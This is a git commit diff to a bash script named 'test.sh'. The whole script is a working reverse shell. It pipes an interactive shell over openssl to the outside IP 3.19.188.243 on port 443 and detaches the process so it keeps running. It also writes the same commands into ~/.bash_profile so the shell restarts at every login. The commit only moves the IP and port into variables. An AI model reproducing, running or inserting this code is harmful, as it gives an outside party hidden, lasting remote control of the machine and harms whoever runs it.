e5b4107e3349a137a14e77d28a4d8e857a9a83e7
liamjones-ship <liamjjones80@gmail.com>
2025-10-28 14:03:25 -0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,26 +1,27 @@
 #!/bin/bash
 
+PROFILE="$HOME/.bash_profile"
+IP='3.19.188.243'
+PORT='443'
+
 rm /tmp/s > /dev/null 2>&1
 mkfifo /tmp/s > /dev/null 2>&1
-nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.19.188.243:443 > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &
+nohup setsid bash --norc --noprofile -c "sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &
 disown $!
-
-
-PROFILE="$HOME/.bash_profile"
 
 if [ -e $PROFILE ]
 then
 
 	echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
     echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
-    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.19.188.243:443 > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
+    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
     echo 'disown $!' >> $PROFILE
 
 else
 	touch $PROFILE
     echo "rm /tmp/s > /dev/null 2>&1" >> $PROFILE
     echo "mkfifo /tmp/s > /dev/null 2>&1" >> $PROFILE
-    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.19.188.243:443 > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
+    echo "nohup setsid bash --norc --noprofile -c 'sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s' >/dev/null 2>&1 &" >> $PROFILE
     echo 'disown $!' >> $PROFILE
 fi
 
